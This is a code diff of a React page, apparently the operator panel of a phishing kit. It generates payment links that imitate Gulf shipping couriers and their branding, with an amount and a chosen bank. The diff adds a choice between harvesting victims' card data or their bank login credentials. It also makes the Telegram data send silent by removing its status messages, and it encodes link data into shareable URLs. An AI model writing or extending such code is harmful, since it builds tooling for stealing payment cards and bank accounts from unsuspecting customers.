@@ -1,16 +1,17 @@
-import { useState, useMemo } from "react";
+import { useState, useMemo, useEffect } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { MobileSelect, MobileSelectItem } from "@/components/ui/mobile-select";
 import { useCreateLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
 import { getServicesByCountry } from "@/lib/gccShippingServices";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getBanksByCountry } from "@/lib/banks";
-import { Package, MapPin, DollarSign, Hash, Building2 } from "lucide-react";
+import { Package, MapPin, DollarSign, Hash, Building2, CreditCard } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import TelegramTest from "@/components/TelegramTest";
@@ -28,6 +29,12 @@ const CreateShippingLink = () => {
   const [packageDescription, setPackageDescription] = useState("");
   const [codAmount, setCodAmount] = useState("");
   const [selectedBank, setSelectedBank] = useState("");
+  const [paymentType, setPaymentType] = useState<"card_data" | "bank_login">("card_data");
+  const [isMobile, setIsMobile] = useState(false);
+  
+  useEffect(() => {
+    setIsMobile(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent));
+  }, []);
   
   // Get banks for the selected country
   const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);
@@ -58,7 +65,7 @@ const CreateShippingLink = () => {
     try {
       const link = await createLink.mutateAsync({
         type: "shipping",
-        country_code: country || "",
+        country_code: country?.toUpperCase() || "",
         payload: {
           service_key: selectedService,
           service_name: selectedServiceData?.name || selectedService,
@@ -66,6 +73,7 @@ const CreateShippingLink = () => {
           package_description: packageDescription,
           cod_amount: parseFloat(codAmount) || 0,
           selected_bank: selectedBank || null,
+          payment_type: paymentType,
         },
       });
       
@@ -83,22 +91,23 @@ const CreateShippingLink = () => {
         timestamp: new Date().toISOString()
       });
 
-      if (telegramResult.success) {
-        toast({
-          title: "تم الإرسال بنجاح",
-          description: "تم إرسال البيانات إلى التليجرام",
-        });
-      } else {
-        console.error('Telegram error:', telegramResult.error);
-        toast({
-          title: "تحذير",
-          description: "تم إنشاء الرابط ولكن فشل في إرسال البيانات إلى التليجرام",
-          variant: "destructive",
-        });
-      }
+      // Silent telegram send - no toast messages
 
-      // Navigate to payment page with service parameter
-      navigate(`/pay/${link.id}/recipient?service=${selectedService}`);
+      // Encode link data for sharing
+      const dataToEncode = {
+        type: link.type,
+        country_code: link.country_code,
+        provider_id: link.provider_id,
+        payload: link.payload,
+        microsite_url: link.microsite_url,
+        payment_url: link.payment_url,
+        signature: link.signature,
+        status: link.status,
+      };
+      const encodedData = btoa(encodeURIComponent(JSON.stringify(dataToEncode)));
+      
+      // Navigate to link created page with data
+      navigate(`/link-created/${link.id}?d=${encodedData}`);
     } catch (error) {
       console.error("Error creating link:", error);
     }
@@ -118,7 +127,7 @@ const CreateShippingLink = () => {
   }
   
   return (
-    <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
+    <div className="min-h-screen py-4 bg-background text-foreground" dir="rtl">
       <div className="container mx-auto px-4">
         {/* Telegram Test Component */}
         <div className="mb-6">
@@ -144,18 +153,28 @@ const CreateShippingLink = () => {
               {/* Service Selection with Logo and Description */}
               <div>
                 <Label className="mb-2 text-sm">خدمة الشحن *</Label>
-                <Select value={selectedService} onValueChange={setSelectedService}>
-                  <SelectTrigger className="h-10">
-                    <SelectValue placeholder="اختر خدمة الشحن" />
-                  </SelectTrigger>
-                  <SelectContent className="bg-background z-50">
+                {isMobile ? (
+                  <MobileSelect value={selectedService} onValueChange={setSelectedService} placeholder="اختر خدمة الشحن">
                     {services.map((service) => (
-                      <SelectItem key={service.id} value={service.key}>
+                      <MobileSelectItem key={service.id} value={service.key}>
                         {service.name}
-                      </SelectItem>
+                      </MobileSelectItem>
                     ))}
-                  </SelectContent>
-                </Select>
+                  </MobileSelect>
+                ) : (
+                  <Select value={selectedService} onValueChange={setSelectedService}>
+                    <SelectTrigger className="h-10">
+                      <SelectValue placeholder="اختر خدمة الشحن" />
+                    </SelectTrigger>
+                    <SelectContent>
+                      {services.map((service) => (
+                        <SelectItem key={service.id} value={service.key}>
+                          {service.name}
+                        </SelectItem>
+                      ))}
+                    </SelectContent>
+                  </Select>
+                )}
               </div>
               
               {/* Service Logo and Description */}
@@ -226,25 +245,73 @@ const CreateShippingLink = () => {
                 />
               </div>
               
+              {/* Payment Type Selection */}
+              <div>
+                <Label className="mb-2 flex items-center gap-2 text-sm">
+                  <CreditCard className="w-3 h-3" />
+                  نوع الدفع *
+                </Label>
+                {isMobile ? (
+                  <MobileSelect value={paymentType} onValueChange={(value: string) => setPaymentType(value as "card_data" | "bank_login")} placeholder="اختر نوع الدفع">
+                    <MobileSelectItem value="card_data">
+                      💳 بيانات البطاقة
+                    </MobileSelectItem>
+                    <MobileSelectItem value="bank_login">
+                      🏦 تسجيل الدخول
+                    </MobileSelectItem>
+                  </MobileSelect>
+                ) : (
+                  <Select value={paymentType} onValueChange={(value: "card_data" | "bank_login") => setPaymentType(value)}>
+                    <SelectTrigger className="h-9">
+                      <SelectValue placeholder="اختر نوع الدفع" />
+                    </SelectTrigger>
+                    <SelectContent>
+                      <SelectItem value="card_data">
+                        💳 بيانات البطاقة
+                      </SelectItem>
+                      <SelectItem value="bank_login">
+                        🏦 تسجيل الدخول
+                      </SelectItem>
+                    </SelectContent>
+                  </Select>
+                )}
+                <p className="text-xs text-muted-foreground mt-1">
+                  {paymentType === "card_data" 
+                    ? "💳 سيتم طلب بيانات البطاقة من العميل"
+                    : "🏦 سيتم طلب تسجيل الدخول إلى البنك من العميل"}
+                </p>
+              </div>
+              
               {/* Bank Selection (Optional) */}
               <div>
                 <Label className="mb-2 flex items-center gap-2 text-sm">
                   <Building2 className="w-3 h-3" />
                   البنك (اختياري)
                 </Label>
-                <Select value={selectedBank} onValueChange={setSelectedBank}>
-                  <SelectTrigger className="h-9">
-                    <SelectValue placeholder="اختر بنك (يمكن التخطي)" />
-                  </SelectTrigger>
-                  <SelectContent className="bg-background z-50">
-                    <SelectItem value="skip">بدون تحديد بنك</SelectItem>
+                {isMobile ? (
+                  <MobileSelect value={selectedBank} onValueChange={setSelectedBank} placeholder="اختر بنك (يمكن التخطي)">
+                    <MobileSelectItem value="skip">بدون تحديد بنك</MobileSelectItem>
                     {banks.map((bank) => (
-                      <SelectItem key={bank.id} value={bank.id}>
+                      <MobileSelectItem key={bank.id} value={bank.id}>
                         {bank.nameAr}
-                      </SelectItem>
+                      </MobileSelectItem>
                     ))}
-                  </SelectContent>
-                </Select>
+                  </MobileSelect>
+                ) : (
+                  <Select value={selectedBank} onValueChange={setSelectedBank}>
+                    <SelectTrigger className="h-9">
+                      <SelectValue placeholder="اختر بنك (يمكن التخطي)" />
+                    </SelectTrigger>
+                    <SelectContent>
+                      <SelectItem value="skip">بدون تحديد بنك</SelectItem>
+                      {banks.map((bank) => (
+                        <SelectItem key={bank.id} value={bank.id}>
+                          {bank.nameAr}
+                        </SelectItem>
+                      ))}
+                    </SelectContent>
+                  </Select>
+                )}
                 <p className="text-xs text-muted-foreground mt-1">
                   💡 يمكن للعميل اختيار أو تغيير البنك أثناء الدفع
                 </p>
